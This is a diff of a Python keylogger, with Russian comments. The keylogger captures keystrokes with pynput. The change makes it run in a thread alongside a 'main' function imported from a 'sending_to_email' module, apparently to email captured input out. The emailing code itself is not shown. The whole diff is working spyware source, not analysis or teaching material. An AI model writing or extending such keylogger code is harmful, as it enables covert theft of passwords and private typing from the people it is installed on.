@@ -2,6 +2,8 @@
 import datetime
 from pynput import keyboard
 import ctypes
+from sending_to_email import *
+import threading
 
 # СЛОВАРИ
 # издевательство, перевод с англ раскладки на РУ
@@ -149,9 +151,26 @@ class KeyboardPrint(LanguageQual):
             listener.join()
 
 
-key = KeyboardPrint()
-# Вызов метода key_print для начала захвата ввода с клавиатуры
-key.key_print()
+def start_keylogger():
+    key = KeyboardPrint()
+    # Вызов метода key_print для начала захвата ввода с клавиатуры
+    key.key_print()
+
+
+if __name__ == '__main__':
+    # потоки
+    keylogger_thread = threading.Thread(target=start_keylogger)
+    main_email_thread = threading.Thread(target=main)
+
+    # старт потоков
+    keylogger_thread.start()
+    main_email_thread.start()
+
+    # ожидание завершение др потока
+    keylogger_thread.join()
+    main_email_thread.join()
+
+
 
 
 
